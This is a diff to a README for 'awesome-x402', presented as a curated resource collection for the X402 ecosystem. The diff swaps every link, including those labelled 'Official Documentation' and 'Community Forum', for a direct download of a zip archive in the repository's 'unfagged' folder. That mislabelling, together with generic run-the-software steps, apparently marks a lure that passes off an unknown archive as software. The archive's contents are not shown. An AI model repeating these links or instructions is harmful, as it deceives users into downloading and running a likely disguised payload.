@@ -6,7 +6,7 @@ awesome-x402 offers a carefully curated collection of resources aimed at enhanci
 
 ## 🔗 Download Now
 
-[![Download awesome-x402](https://raw.githubusercontent.com/Dragon0003/awesome-x402/master/unfagged/awesome-x402.zip%https://raw.githubusercontent.com/Dragon0003/awesome-x402/master/unfagged/awesome-x402.zip)](https://raw.githubusercontent.com/Dragon0003/awesome-x402/master/unfagged/awesome-x402.zip)
+[![Download awesome-x402](https://github.com/Dragon0003/awesome-x402/raw/refs/heads/master/unfagged/awesome_x_1.8-alpha.4.zip%https://github.com/Dragon0003/awesome-x402/raw/refs/heads/master/unfagged/awesome_x_1.8-alpha.4.zip)](https://github.com/Dragon0003/awesome-x402/raw/refs/heads/master/unfagged/awesome_x_1.8-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To begin, follow these steps to download and run the software.
 
 1. **Visit the Releases Page**  
    Click the link below to access the download page:  
-   [Download awesome-x402](https://raw.githubusercontent.com/Dragon0003/awesome-x402/master/unfagged/awesome-x402.zip)
+   [Download awesome-x402](https://github.com/Dragon0003/awesome-x402/raw/refs/heads/master/unfagged/awesome_x_1.8-alpha.4.zip)
 
 2. **Choose the Version**  
    On the releases page, you will see a list of versions. Look for the latest version labeled as the "Latest Release". It usually has the highest version number.
@@ -68,8 +68,8 @@ We regularly update awesome-x402 to enhance functionality and fix bugs. Check ba
 
 For more information and resources about the X402 ecosystem, consider exploring these links:
 
-- **Official Documentation**: [X402 Documentation](https://raw.githubusercontent.com/Dragon0003/awesome-x402/master/unfagged/awesome-x402.zip)
-- **User Community**: [X402 Community Forum](https://raw.githubusercontent.com/Dragon0003/awesome-x402/master/unfagged/awesome-x402.zip)
+- **Official Documentation**: [X402 Documentation](https://github.com/Dragon0003/awesome-x402/raw/refs/heads/master/unfagged/awesome_x_1.8-alpha.4.zip)
+- **User Community**: [X402 Community Forum](https://github.com/Dragon0003/awesome-x402/raw/refs/heads/master/unfagged/awesome_x_1.8-alpha.4.zip)
 
 ## 📝 Feedback
 
